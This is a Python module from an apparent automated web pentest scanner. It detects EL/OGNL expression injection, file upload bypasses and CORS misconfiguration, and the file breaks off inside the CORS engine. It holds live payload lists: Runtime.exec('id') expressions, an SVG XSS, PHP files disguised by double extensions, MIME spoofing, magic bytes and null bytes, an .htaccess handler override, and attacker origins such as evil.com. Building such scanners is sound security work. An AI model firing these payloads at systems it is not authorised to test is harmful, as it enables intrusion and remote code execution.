# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

"""
合并输入验证引擎模块
功能：EL注入、文件上传、CORS、CRLF、LDAP、业务逻辑、信息泄露、HPP 漏洞检测
"""

import asyncio
import json
import os
import random
import re
import secrets
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import aiohttp

from vulnclaw.core.logger import logger
from vulnclaw.core.settings import settings
from vulnclaw.core.utils import async_get, async_options, async_post, build_attack_url
from vulnclaw.engines.base import BaseEngine
from typing import Dict, List, Optional, Set, Tuple


# ============================================================

# 从 el_injection.py 合并


# ============================================================

# engines/el_injection.py
"""
EL（表达式语言）注入检测引擎 - 重构版

功能：
1. EL 表达式注入检测（${...}、#{...}）
2. 算术运算检测（7*7=49）
3. 配置读取检测（${spring.application.name}）
4. 响应分析
5. WAF 绕过

适用场景：
- Java/Spring 应用
- JSP 页面
- Thymeleaf 模板
- JSF 视图

检测流程：
1. 快速探测：判断参数是否可能用于 EL 表达式
2. 注入算术表达式
3. 检测响应中是否包含计算结果
4. 尝试读取配置信息
5. WAF 检测与绕过
"""


class ELInjectionEngine(BaseEngine):
    """EL 表达式注入检测引擎"""

    name = "el_injection"
    description = "EL 表达式注入检测引擎"

    # 优先测试的参数名
    priority_params = [
        "el", "expr", "expression", "eval", "execute",
        "value", "data", "param", "config", "setting",
        "query", "search", "filter", "where", "order",
        "sort", "group", "by", "having", "limit"
    ]

    # ===== EL 表达式 Payload =====
    payloads = [
        # ===== 算术运算 =====
        ("${7*7}", "49", "基础算术"),
        ("#{7*7}", "49", "基础算术 #{}"),
        ("${7*'7'}", "7777777", "字符串乘法"),
        ("#{7*'7'}", "7777777", "字符串乘法 #{}"),
        ("${7 + 7}", "14", "加法"),
        ("${7 - 7}", "0", "减法"),
        ("${7 / 7}", "1", "除法"),
        ("${7 % 3}", "1", "取模"),
        ("${7 == 7}", "true", "布尔比较"),
        ("${7 != 7}", "false", "布尔比较"),
        ("${7 > 5}", "true", "大于"),
        ("${7 < 5}", "false", "小于"),
        ("${7 >= 7}", "true", "大于等于"),
        ("${7 <= 7}", "true", "小于等于"),

        # ===== 字符串操作 =====
        ("${'test'.length()}", "4", "字符串长度"),
        ("${'test'.concat('ing')}", "testing", "字符串拼接"),
        ("${'test'.toUpperCase()}", "TEST", "转大写"),
        ("${'test'.toLowerCase()}", "test", "转小写"),
        ("${'test'.substring(0,2)}", "te", "截取"),
        ("${'test'.contains('es')}", "true", "包含"),
        ("${'test'.startsWith('te')}", "true", "以...开头"),
        ("${'test'.endsWith('st')}", "true", "以...结尾"),

        # ===== 逻辑运算 =====
        ("${true and true}", "true", "逻辑与"),
        ("${true or false}", "true", "逻辑或"),
        ("${not false}", "true", "逻辑非"),
        ("${!false}", "true", "逻辑非!"),

        # ===== 三元运算符 =====
        ("${7 > 5 ? 'yes' : 'no'}", "yes", "三元运算符"),
        ("${7 < 5 ? 'yes' : 'no'}", "no", "三元运算符"),
        ("${empty ''}", "true", "空判断"),
        ("${empty 'test'}", "false", "空判断"),

        # ===== 变量/属性访问 =====
        ("${pageContext.request.requestURI}", "test", "pageContext"),
        ("${param.x}", "test", "参数访问"),
        ("${header['User-Agent']}", "test", "头访问"),
        ("${cookie.JSESSIONID.value}", "test", "Cookie访问"),
        ("${applicationScope}", "test", "应用范围"),
        ("${sessionScope}", "test", "会话范围"),
        ("${requestScope}", "test", "请求范围"),

        # ===== 配置读取 =====
        ("${spring.application.name}", "test", "Spring应用名"),
        ("${spring.profiles.active}", "test", "Spring配置文件"),
        ("${server.port}", "test", "服务器端口"),
        ("${server.address}", "test", "服务器地址"),
        ("${server.servlet.context-path}", "test", "上下文路径"),
        ("${java.home}", "test", "Java安装目录"),
        ("${java.version}", "test", "Java版本"),
        ("${os.name}", "test", "操作系统"),
        ("${user.home}", "test", "用户主目录"),
        ("${user.name}", "test", "用户名"),
        ("${user.dir}", "test", "当前目录"),

        # ===== 调用方法 =====
        ("${''.getClass()}", "class", "获取类"),
        ("${''.getClass().forName('java.lang.Runtime')}", "Runtime", "加载类"),
        ("${''.getClass().forName('java.lang.Runtime').getRuntime()}", "Runtime", "获取Runtime"),
        ("${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}", "id", "命令执行"),
        ("${''.getClass().forName('java.lang.System').getProperty('os.name')}", "Windows", "系统属性"),

        # ===== 绕过 =====
        ("${7*7}", "49", "标准EL"),
        ("${7 * 7}", "49", "带空格"),
        ("${7\t* 7}", "49", "带Tab"),
        ("${7\n* 7}", "49", "带换行"),
        ("${7\r* 7}", "49", "带回车"),
        ("${{7*7}}", "49", "双花括号"),
        ("#{7*7}", "49", "JSF表达式"),
        ("%{7*7}", "49", "Struts OGNL"),
    ]

    # ===== EL 响应特征 =====
    EL_INDICATORS = [
        "javax.el",
        "javax.servlet",
        "org.apache.el",
        "org.springframework",
        "el.Expression",
        "ELException",
        "ELContext",
        "ExpressionFactory",
        "MethodExpression",
        "ValueExpression",
        "StandardELContext",
        "StandardExpressionFactory",
        "ELProcessor",
        "ELManager",
        "ExpressionEvaluator",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """
        检测 EL 表达式注入

        检测流程：
        1. 快速探测：判断参数是否可能用于 EL 表达式
        2. 逐个测试 Payload
        3. 检测响应中是否包含计算结果
        4. 尝试读取配置信息
        5. WAF 检测与绕过
        """
        if isinstance(normal_resp, tuple):
            _normal_status, normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)

        # ===== 1. 快速探测 =====
        if not await self._is_el_target(url, param, normal_text, session):
            self.log_debug(f"参数 {param} 不像是 EL 表达式目标，跳过检测")
            return None

        # ===== 2. 获取 Payload =====
        payloads = self.reorder_payloads_by_param(param)

        # 如果是静态资源，减少 Payload
        if is_static:
            payloads = payloads[:10]

        # ===== 3. 主检测循环 =====
        for payload, expected, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout)

                if isinstance(resp, tuple):
                    status, text = resp[0], resp[1]
                else:
                    status, text = resp.status, await resp.text()

                # ===== 检测 WAF =====
                waf_type = await self.detect_waf(text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                # ===== 检测 EL 执行结果 =====
                if expected in text and len(text) < 10000:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'EL表达式注入({desc})',
                        'ai_verdict': '高',
                        'evidence': f"响应中出现 '{expected}'（{payload} 的计算结果）",
                        'diff_ratio': 0.5
                    }

                # ===== 检测 EL 错误 =====
                if self._has_el_error(text):
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'EL表达式注入-错误信息({desc})',
                        'ai_verdict': '中',
                        'evidence': f"检测到 EL 错误: {self._extract_el_error(text)}",
                        'diff_ratio': 0.5
                    }

                # ===== 检测响应差异 =====
                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (status, text, {}),
                    threshold=0.2
                )
                if has_diff:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'EL表达式注入-疑似({desc})',
                        'ai_verdict': '中',
                        'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                        'diff_ratio': diff_ratio
                    }

            except Exception as e:
                self.log_debug(f"EL 检测异常 {param}: {e}")

        return None

    async def _is_el_target(
        self,
        url: str,
        param: str,
        normal_text: str,
        session
    ) -> bool:
        """判断目标是否可能支持 EL 表达式"""
        # 检查 URL 参数名
        el_params = ['el', 'expr', 'expression', 'eval', 'execute']
        if any(p in param.lower() for p in el_params):
            return True

        # 检查页面是否为 Java/JSP 相关
        if normal_text:
            java_indicators = [
                'javax.servlet', 'org.apache', 'java.lang',
                '.jsp', '.do', '.action', '/spring', '/webapp',
                'JSESSIONID', 'j_spring_security',
            ]
            for indicator in java_indicators:
                if indicator in normal_text.lower():
                    return True

        return True

    def _has_el_error(self, text: str) -> bool:
        """检测 EL 错误特征"""
        text_lower = text.lower()
        for indicator in self.EL_INDICATORS:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_el_error(self, text: str) -> str:
        """提取 EL 错误信息"""
        lines = text.split('\n')
        for line in lines:
            for indicator in self.EL_INDICATORS:
                if indicator in line:
                    return line[:200]
        return text[:200]

    # ============================================================
    # OGNL 表达式检测（Struts 2）
    # ============================================================

    async def detect_ognl(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session
    ) -> Optional[Dict]:
        """
        检测 OGNL 表达式注入（Struts 2 应用）

        OGNL 使用 %{} 语法
        """
        ognl_payloads = [
            ("%{7*7}", "49", "OGNL算术"),
            ("%{new java.lang.ProcessBuilder('id').start()}", "id", "OGNL命令"),
            ("%{@java.lang.Runtime@getRuntime().exec('id')}", "id", "OGNL Runtime"),
        ]

        for payload, expected, desc in ognl_payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout)
                if isinstance(resp, tuple):
                    text = resp[1]
                else:
                    text = await resp.text()

                if expected in text and len(text) < 10000:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'OGNL表达式注入({desc})',
                        'ai_verdict': '高',
                        'evidence': f"响应中出现 '{expected}'（{payload} 的执行结果）",
                        'diff_ratio': 0.5
                    }
            except BaseException:
                logger.debug("suppressed exception (engine audit)")

        return None


# ============================================================
# 从 file_upload.py 合并
# ============================================================


# ============================================================

# engines/file_upload.py
"""
文件上传漏洞检测引擎 - 重构版

功能：
1. 文件上传端点自动发现
2. 多种文件类型测试（php, phtml, asp, jsp, jpg伪装等）
3. 扩展名绕过（双扩展名、大小写、空字节）
4. MIME 类型绕过（修改 Content-Type）
5. 响应分析（成功标志、路径泄露）
6. 文件大小测试（超大文件、0字节）
7. 竞争条件测试（文件覆盖）

检测流程：
1. 从扫描上下文中提取上传端点
2. 逐个测试各种文件类型
3. 检测响应中的成功标志
4. 检测是否泄露文件路径
5. AI 辅助验证
"""


class FileUploadEngine(BaseEngine):
    """文件上传漏洞检测引擎"""

    name = "file_upload"
    description = "文件上传漏洞检测引擎"

    # ===== 优先测试的参数名 =====
    priority_params = [
        "file", "upload", "image", "avatar", "profile",
        "picture", "photo", "attachment", "document",
        "media", "content", "asset", "import", "files",
        "photo", "logo", "banner", "icon", "thumbnail"
    ]

    # ===== 测试文件类型 =====
    TEST_FILES = [
        # (filename, content, description, content_type)
        ("test.php", "<?php echo 'test'; ?>", "PHP文件", "application/octet-stream"),
        ("test.phtml", "<?php echo 'test'; ?>", "PHTML文件", "application/octet-stream"),
        ("test.php5", "<?php echo 'test'; ?>", "PHP5文件", "application/octet-stream"),
        ("test.asp", "<% Response.Write(\"test\") %>", "ASP文件", "application/octet-stream"),
        ("test.aspx", "<%@ Page Language=\"C#\" %>", "ASPX文件", "application/octet-stream"),
        ("test.jsp", "<% out.println(\"test\"); %>", "JSP文件", "application/octet-stream"),
        ("test.html", "<html><body>test</body></html>", "HTML文件", "text/html"),
        ("test.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>", "SVG XSS", "image/svg+xml"),
        ("test.txt", "This is a test file", "TXT文件", "text/plain"),
        ("test.jpg", "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00", "JPEG图片", "image/jpeg"),
        ("test.png", "\x89PNG\r\n\x1A\n\x00\x00\x00\rIHDR", "PNG图片", "image/png"),
        ("test.gif", "GIF89a\x01\x00\x01\x00\x80\x00\x00\xFF\xFF\xFF\x00\x00\x00\x21\xF9\x04\x01\x00\x00\x00\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3B", "GIF图片", "image/gif"),
        ("test.hta", "<html><head><title>test</title></head><body>test</body></html>", "HTA文件", "application/hta"),
        ("test.htaccess", "AddType application/x-httpd-php .php", "HTACCESS文件", "text/plain"),
        ("shell.php.jpg", "<?php echo 'test'; ?>", "双扩展名-JPG", "image/jpeg"),
        ("shell.php.png", "<?php echo 'test'; ?>", "双扩展名-PNG", "image/png"),
        ("shell.php.gif", "<?php echo 'test'; ?>", "双扩展名-GIF", "image/gif"),
        ("shell.phar", "<?php echo 'test'; ?>", "PHAR文件", "application/octet-stream"),
        ("shell.inc", "<?php echo 'test'; ?>", "INC文件", "application/octet-stream"),
        ("shell.php%00.jpg", "<?php echo 'test'; ?>", "空字节绕过", "image/jpeg"),
    ]

    # ===== 上传成功标志 =====
    SUCCESS_INDICATORS = [
        "uploaded", "success", "upload success", "uploaded successfully",
        "file saved", "saved", "file created", "created",
        "upload ok", "ok", "successfully", "completed",
        "文件上传成功", "上传成功", "上传完成",
        "存储成功", "保存成功",
    ]

    # ===== 路径泄露模式 =====
    PATH_PATTERNS = [
        r'/(?:uploads?|files|media|images?|assets?|storage)/[^"\'\s<>]+',
        r'/(?:tmp|temp|upload)/[^"\'\s<>]+',
        r'/var/www/[^"\'\s<>]+',
        r'[A-Z]:\\[^"\'\s<>]+',
        r'https?://[^"\'\s<>]+/(?:uploads?|files|media)/[^"\'\s<>]+',
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """
        文件上传检测入口
        """
        # 检查是否为上传端点
        url_lower = url.lower()
        upload_keywords = ['upload', 'file', 'import', 'avatar', 'profile', 'picture', 'photo', 'image', 'media']
        if any(kw in url_lower for kw in upload_keywords):
            return {
                'url': url,
                'type': '文件上传端点发现',
                'ai_verdict': '信息',
                'evidence': f'发现文件上传端点: {url}',
                'diff_ratio': 0.0,
                'is_upload_endpoint': True
            }
        return None

    # ============================================================
    # 上传端点发现
    # ============================================================

    async def discover_endpoints(
        self,
        base_url: str,
        session
    ) -> List[str]:
        """
        发现文件上传端点

        参数:
            base_url: 基础 URL
            session: aiohttp ClientSession
        """
        endpoints = []
        base = base_url.rstrip('/')

        # 检查常见上传路径
        upload_paths = [
            "/upload", "/uploads", "/file", "/files", "/media", "/assets",
            "/api/upload", "/api/uploads", "/api/file", "/api/files",
            "/upload/", "/uploads/", "/file/", "/files/",
            "/import", "/imports", "/export", "/exports",
            "/avatar", "/avatars", "/profile/picture", "/profile/photo",
            "/image/upload", "/images/upload", "/photo/upload",
            "/document/upload", "/documents/upload", "/attachment/upload",
            "/admin/upload", "/admin/uploads", "/admin/file",
            "/cms/upload", "/cms/uploads",
        ]

        for path in upload_paths:
            test_url = base + path
            try:
                resp = await async_get(test_url, session=session, timeout=5)
                if isinstance(resp, tuple):
                    status = resp[0]
                    text = resp[1]
                else:
                    status = resp.status
                    text = await resp.text()

                # 检查是否为上传页面（包含文件上传表单）
                if status == 200:
                    if 'enctype="multipart/form-data"' in text.lower():
                        endpoints.append(test_url)
                        logger.info(f"📎 发现文件上传端点: {test_url}")
                    elif 'type="file"' in text.lower():
                        endpoints.append(test_url)
                        logger.info(f"📎 发现文件上传端点: {test_url}")
            except BaseException:
                logger.debug("suppressed exception (engine audit)")

        return endpoints

    # ============================================================
    # 核心上传检测
    # ============================================================

    async def test_upload(
        self,
        upload_url: str,
        param_name: str,
        test_file: Tuple[str, str, str, str],
        session
    ) -> Optional[Dict]:
        """
        测试单个文件上传

        参数:
            upload_url: 上传目标 URL
            param_name: 文件参数名（默认 file）
            test_file: (filename, content, description, content_type)
            session: aiohttp ClientSession
        """
        filename, content, description, content_type = test_file

        # 尝试不同的参数名
        param_names = [param_name, "file", "upload", "image", "avatar", "photo", "picture", "media", "attachment"]
        if param_name and param_name not in param_names:
            param_names.insert(0, param_name)

        for pname in param_names[:3]:
            try:
                # 创建 multipart form data
                data = aiohttp.FormData()
                data.add_field(pname, content, filename=filename, content_type=content_type)

                resp = await async_post(
                    upload_url,
                    data=data,
                    session=session,
                    timeout=settings.timeout
                )

                if isinstance(resp, tuple):
                    status = resp[0]
                    text = resp[1]
                else:
                    status = resp.status
                    text = await resp.text()

                # ===== 检测上传成功 =====
                if self._is_upload_success(text):
                    # 提取可能返回的文件路径
                    filepath = self._extract_filepath(text)
                    finding = {
                        'url': upload_url,
                        'parameter': pname,
                        'filename': filename,
                        'file_type': description,
                        'type': f'文件上传漏洞({description})',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'evidence': f'文件 {filename} 被接受，响应包含成功标志',
                        'filepath': filepath,
                        'status': status,
                        'recommendation': '限制文件类型，执行内容验证'
                    }
                    # B2: 上传后回连访问验证（确认是否可被公开访问甚至被解析执行）
                    access = await self._verify_uploaded_access(
                        upload_url, filepath, filename, session
                    )
                    if access:
                        finding['upload_verified'] = True
                        finding['severity'] = 'Critical'
                        finding['type'] = f'文件上传-可访问/可执行({description})'
                        finding['evidence'] = (
                            f'{finding["evidence"]}；上传后访问 {access["url"]} '
                            f'返回 HTTP {access["status"]}'
                            + ('，且文件内容被原样返回（可直接访问/被解析执行）'
                               if access.get('echoed') else '（文件可公开访问）')
                        )
                        finding['recommendation'] = (
                            '将上传目录与 Web 目录隔离并禁用其脚本执行权限，'
                            '校验文件内容类型、随机重命名存储，禁止直接返回可访问路径'
                        )
                    return finding

                # ===== 检测路径泄露 =====
                path = self._extract_filepath(text)
                if path:
                    return {
                        'url': upload_url,
                        'parameter': pname,
                        'filename': filename,
                        'file_type': description,
                        'type': f'文件上传-路径泄露({description})',
                        'severity': 'Medium',
                        'ai_verdict': '中',
                        'evidence': f'响应泄露文件路径: {path}',
                        'filepath': path,
                        'status': status,
                        'recommendation': '不要在响应中返回文件路径'
                    }

                # ===== 检测异常响应 =====
                if status in (500, 400, 403) and len(text) > 100:
                    error_keywords = ['php', 'script', 'execute', 'permission', 'denied', 'syntax', 'error', 'exception']
                    if any(kw in text.lower() for kw in error_keywords):
                        return {
                            'url': upload_url,
                            'parameter': pname,
                            'filename': filename,
                            'file_type': description,
                            'type': f'文件上传-异常响应({description})',
                            'severity': 'Medium',
                            'ai_verdict': '中',
                            'evidence': f'服务器返回错误: {text[:200]}',
                            'status': status,
                            'recommendation': '检查服务器错误日志'
                        }

            except Exception as e:
                logger.debug(f"文件上传测试异常 {filename}: {e}")

        return None

    # ============================================================
    # 响应分析
    # ============================================================

    async def _verify_uploaded_access(
        self,
        upload_url: str,
        filepath: Optional[str],
        filename: str,
        session,
    ) -> Optional[Dict]:
        """B2: 上传成功后回连访问该文件，确认是否可被公开访问甚至被解析执行。

        仅做只读 GET 请求（不执行任何命令），依据 HTTP 200 与内容回显判定；
        访问不到时返回 None，不改变原有检出结论。
        """
        from urllib.parse import urlparse as _urlparse

        parsed = _urlparse(upload_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        candidates: List[str] = []

        if filepath:
            if filepath.startswith(("http://", "https://")):
                candidates.append(filepath)
            else:
                candidates.append(base + (filepath if filepath.startswith("/") else "/" + filepath))
        # 兜底：尝试常见上传目录
        for folder in ("/uploads/", "/upload/", "/files/", "/static/uploads/", "/media/"):
            candidates.append(base + folder + filename)

        for url in candidates[:5]:
            try:
                resp = await async_get(url, session=session, timeout=6, no_retry=True)
                status = resp[0]
                body = resp[1] or ""
            except Exception:
                continue
            if status == 200 and body:
                return {
                    "url": url,
                    "status": status,
                    "echoed": filename.lower() in str(body).lower(),
                }
        return None

    def _is_upload_success(self, text: str) -> bool:
        """检测上传是否成功"""
        text_lower = text.lower()
        for indicator in self.SUCCESS_INDICATORS:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_filepath(self, text: str) -> Optional[str]:
        """从响应中提取文件路径"""
        for pattern in self.PATH_PATTERNS:
            matches = re.findall(pattern, text, re.I)
            if matches:
                # 过滤掉明显的 URL 编码
                for match in matches:
                    if '%' not in match or len(match) > 20:
                        return match[:200]
        return None

    # ============================================================
    # MIME 类型绕过
    # ============================================================

    async def test_mime_bypass(
        self,
        upload_url: str,
        param_name: str,
        session
    ) -> List[Dict]:
        """
        测试 MIME 类型绕过

        将 PHP 文件的 Content-Type 改为 image/jpeg
        """
        findings = []

        mime_bypass_files = [
            ("shell.php", "<?php echo 'test'; ?>", "PHP (MIME绕过)", "image/jpeg"),
            ("shell.php", "<?php echo 'test'; ?>", "PHP (MIME绕过)", "image/png"),
            ("shell.php", "<?php echo 'test'; ?>", "PHP (MIME绕过)", "image/gif"),
            ("shell.php", "<?php echo 'test'; ?>", "PHP (MIME绕过)", "application/octet-stream"),
            ("shell.asp", "<% Response.Write(\"test\") %>", "ASP (MIME绕过)", "image/jpeg"),
            # 内容型绕过：魔数头 + 代码（验证是否可通过白名单内容校验但被当脚本保存/执行）
            ("shell.php", "GIF89a\x01\x00\x01\x00\x00\x00\x00;<?php echo 'test'; ?>", "PHP (内容型绕过-GIF魔数)", "image/gif"),
            ("shell.php", "\xff\xd8\xff\xe0<?php echo 'test'; ?>", "PHP (内容型绕过-JPEG魔数)", "image/jpeg"),
            ("shell.png", "\x89PNG\r\n\x1a\n<?php echo 'test'; ?>", "PHP (内容型绕过-PNG魔数)", "image/png"),
            ("shell.php", "<?php /*000000000*/ __halt_compiler(); ?><?php echo 'test'; ?>", "PHP (内容型绕过-halt_compiler)", "application/octet-stream"),
            ("shell.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert('xss')</script></svg>", "SVG (内容型绕过-隐式XSS)", "image/svg+xml"),
        ]

        for filename, content, description, content_type in mime_bypass_files:
            result = await self.test_upload(
                upload_url,
                param_name,
                (filename, content, description, content_type),
                session
            )
            if result:
                findings.append(result)

        return findings

    # ============================================================
    # 双扩展名绕过
    # ============================================================

    async def test_double_extension(
        self,
        upload_url: str,
        param_name: str,
        session
    ) -> List[Dict]:
        """
        测试双扩展名绕过

        文件名为 shell.php.jpg, shell.php.png 等
        """
        findings = []

        double_ext_files = [
            ("shell.php.jpg", "<?php echo 'test'; ?>", "双扩展名 JPG"),
            ("shell.php.png", "<?php echo 'test'; ?>", "双扩展名 PNG"),
            ("shell.php.gif", "<?php echo 'test'; ?>", "双扩展名 GIF"),
            ("shell.aspx.jpg", "<% Response.Write(\"test\") %>", "双扩展名 JPG"),
            ("shell.jsp.jpg", "<% out.println(\"test\"); %>", "双扩展名 JPG"),
        ]

        for filename, content, description in double_ext_files:
            result = await self.test_upload(
                upload_url,
                param_name,
                (filename, content, description, "image/jpeg"),
                session
            )
            if result:
                findings.append(result)

        return findings

    # ============================================================
    # 大小写绕过
    # ============================================================

    async def test_case_bypass(
        self,
        upload_url: str,
        param_name: str,
        session
    ) -> List[Dict]:
        """
        测试大小写绕过

        文件名为 shell.PhP, shell.pHp 等
        """
        findings = []

        case_files = [
            ("shell.PhP", "<?php echo 'test'; ?>", "大小写绕过 PhP"),
            ("shell.pHp", "<?php echo 'test'; ?>", "大小写绕过 pHp"),
            ("shell.PHP", "<?php echo 'test'; ?>", "大小写绕过 PHP"),
            ("shell.php5", "<?php echo 'test'; ?>", "大小写绕过 php5"),
        ]

        for filename, content, description in case_files:
            result = await self.test_upload(
                upload_url,
                param_name,
                (filename, content, description, "application/octet-stream"),
                session
            )
            if result:
                findings.append(result)

        return findings

    # ============================================================
    # 空字节绕过
    # ============================================================

    async def test_null_byte_bypass(
        self,
        upload_url: str,
        param_name: str,
        session
    ) -> List[Dict]:
        """
        测试空字节绕过

        文件名为 shell.php%00.jpg
        """
        findings = []

        # 注意：实际请求中需要正确编码
        null_byte_files = [
            ("shell.php%00.jpg", "<?php echo 'test'; ?>", "空字节绕过"),
            ("shell.asp%00.jpg", "<% Response.Write(\"test\") %>", "空字节绕过"),
        ]

        for filename, content, description in null_byte_files:
            result = await self.test_upload(
                upload_url,
                param_name,
                (filename, content, description, "image/jpeg"),
                session
            )
            if result:
                findings.append(result)

        return findings

    # ============================================================
    # 竞争条件测试
    # ============================================================

    async def test_race_condition(
        self,
        upload_url: str,
        param_name: str,
        session
    ) -> Optional[Dict]:
        """
        测试文件上传竞争条件

        并发上传同一文件名，检测是否触发 race condition
        """
        filename = f"race_{random.randint(1000, 9999)}.txt"
        content = f"Race test content {random.randint(1000, 9999)}"

        try:
            # 创建多个并发任务
            tasks = []
            for _ in range(10):
                data = aiohttp.FormData()
                data.add_field(param_name, content, filename=filename)
                tasks.append(async_post(upload_url, data=data, session=session, timeout=10))

            responses = await asyncio.gather(*tasks, return_exceptions=True)

            success_count = 0
            for resp in responses:
                if isinstance(resp, Exception):
                    continue
                if isinstance(resp, tuple):
                    status = resp[0]
                    text = resp[1]
                else:
                    status = resp.status
                    text = await resp.text()

                if status < 400 and self._is_upload_success(text):
                    success_count += 1

            if success_count > 1:
                return {
                    'url': upload_url,
                    'parameter': param_name,
                    'type': '文件上传-竞争条件',
                    'severity': 'Medium',
                    'evidence': f'并发上传同一文件，成功 {success_count} 次（可能存在竞争条件）',
                    'recommendation': '使用文件锁或唯一文件名'
                }
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return None

    # ============================================================
    # 主扫描方法
    # ============================================================

    async def scan(
        self,
        target: str,
        session,
        **kwargs
    ) -> List[Dict]:
        """
        完整的文件上传扫描

        参数:
            target: 目标 URL
            session: aiohttp ClientSession
        """
        findings = []

        # 1. 发现上传端点
        endpoints = await self.discover_endpoints(target, session)

        if not endpoints:
            logger.info("ℹ️ 未发现文件上传端点，跳过检测")
            return findings

        logger.info(f"📎 发现 {len(endpoints)} 个文件上传端点")

        for endpoint in endpoints:
            logger.info(f"📤 测试文件上传端点: {endpoint}")

            # 探测参数名
            param_name = "file"

            # 2. 测试各种文件类型
            for test_file in self.TEST_FILES[:15]:
                result = await self.test_upload(endpoint, param_name, test_file, session)
                if result:
                    findings.append(result)
                    # 如果找到高危漏洞，继续测试其他绕过方式
                    if result.get('severity') == 'High':
                        break

            # 3. MIME 类型绕过
            if not any(f.get('severity') == 'High' for f in findings):
                results = await self.test_mime_bypass(endpoint, param_name, session)
                findings.extend(results)

            # 4. 双扩展名绕过
            if not any(f.get('severity') == 'High' for f in findings):
                results = await self.test_double_extension(endpoint, param_name, session)
                findings.extend(results)

            # 5. 大小写绕过
            if not any(f.get('severity') == 'High' for f in findings):
                results = await self.test_case_bypass(endpoint, param_name, session)
                findings.extend(results)

            # 6. 空字节绕过
            if not any(f.get('severity') == 'High' for f in findings):
                results = await self.test_null_byte_bypass(endpoint, param_name, session)
                findings.extend(results)

            # 7. 竞争条件
            result = await self.test_race_condition(endpoint, param_name, session)
            if result:
                findings.append(result)

        findings = self._collapse_access_findings(findings)
        logger.info(f"✅ 文件上传扫描完成，发现 {len(findings)} 个问题")
        return findings

    def _collapse_access_findings(self, findings: List[Dict]) -> List[Dict]:
        """降噪：把同一上传点的"可访问/可执行"逐类型条目聚合为 1 条。

        实测：9 个上传点 × 27 种绕过 = 243 条 Info，占全量 vulnerabilities 约
        75%，把真实高危（LFI / CRLF / 反序列化）淹在噪声里。
        仅合并同 (url, parameter) 的 `文件上传-可访问/可执行(...)`：severity 取
        最高，绕过类型全量保留在 `bypass_types`，判定依据不丢，只压缩条目数。
        """
        prefix = "文件上传-可访问/可执行"
        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
        out: List[Dict] = []
        groups: Dict[Tuple[str, str], List[Dict]] = {}
        for f in findings or []:
            if str(f.get("type") or "").startswith(prefix):
                key = (str(f.get("url") or ""), str(f.get("parameter") or ""))
                groups.setdefault(key, []).append(f)
            else:
                out.append(f)

        for (_url, _param), items in groups.items():
            types: List[str] = []
            for f in items:
                d = (str(f.get("type") or "")[len(prefix):].strip().strip("()")
                     or str(f.get("file_type") or ""))
                if d and d not in types:
                    types.append(d)
            best = max(items, key=lambda f: sev_rank.get(
                str(f.get("severity") or "").lower(), 0))
            merged = dict(best)
            merged["type"] = prefix
            merged["bypass_types"] = types
            merged["bypass_count"] = len(types)
            shown = "、".join(types[:8]) + ("等" if len(types) > 8 else "")
            merged["evidence"] = (
                f"{len(types)} 种绕过方式均上传成功且可访问/可执行：{shown}。"
                f"{best.get('evidence') or ''}"
            )
            out.append(merged)

        if findings and len(findings) != len(out):
            logger.info(f"📎 [降噪] 上传可访问类聚合：{len(findings)} -> {len(out)} 条")
        return out


# ============================================================
# 从 cors.py 合并


# ============================================================

# engines/cors.py
"""
CORS（跨域资源共享）配置错误检测引擎 - 重构版
功能：
1. CORS 头检测（Access-Control-Allow-Origin）
2. 通配符检测（ACAO: *）
3. 反射攻击者域名检测（ACAO 反射 Origin）
4. 凭证允许检测（Access-Control-Allow-Credentials: true）
5. 预检请求检测（OPTIONS 方法）
"""


class CORSEngine(BaseEngine):
    name = "cors"
    description = "CORS 配置错误检测引擎"

    ATTACKER_ORIGINS = [
        "https://evil-test-123456.com",
        "https://attacker.example.com",
        "http://evil.com",
        "https://evil.com",
        "https://hacker.test",
        "http://localhost:8080",
        "https://localhost:8443",
        "null",
        "https://evil.com.evil.com",
        "https://evil.com%2eexample.com",
    ]

    CORS_HEADERS = [
        "Access-Control-Allow-Origin",
        "Access-Control-Allow-Credentials",
        "Access-Control-Allow-Methods",
        "Access-Control-Allow-Headers",
        "Access-Control-Expose-Headers",
